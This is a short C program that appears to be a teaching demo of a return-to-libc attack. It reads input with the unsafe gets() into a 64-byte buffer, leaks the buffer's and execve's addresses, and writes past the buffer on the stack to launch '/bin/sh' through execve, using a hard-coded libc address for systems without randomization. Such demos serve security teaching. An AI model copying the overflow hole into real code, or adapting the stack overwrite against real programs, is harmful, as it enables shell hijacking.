#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
void called(unsigned long a, unsigned long b, unsigned long c){
	printf("%ld %ld %ld\n",a,b,c);
} 

int main(){
	char name[64],*cptr;
        unsigned long *ptr;
	printf("buffer address: %p\n", name);  //print address of buffer
        puts("Enter text for name:");
        gets(name);
        printf("content of buffer: %s\n", name);
        printf("execve of execve: %p\n", execve);
        
        memset(name,0,64);
        strcpy(name,"/bin/sh"); 
        
        cptr = name+80+8;
        ptr = (unsigned long *)cptr;
     
	
        
        *(ptr+5) = (unsigned long *) name; //first arg
	*(ptr+6) = (unsigned long*) NULL;        //second //arg
	*(ptr+7)=(unsigned long *)NULL;	//third arg
	//*(ptr+3) = (unsigned long *)execve;
	//OR if randomization is disabled
	*(ptr+3) = (unsigned long *)0xf7e9e2b0;
	

        return 0;

}
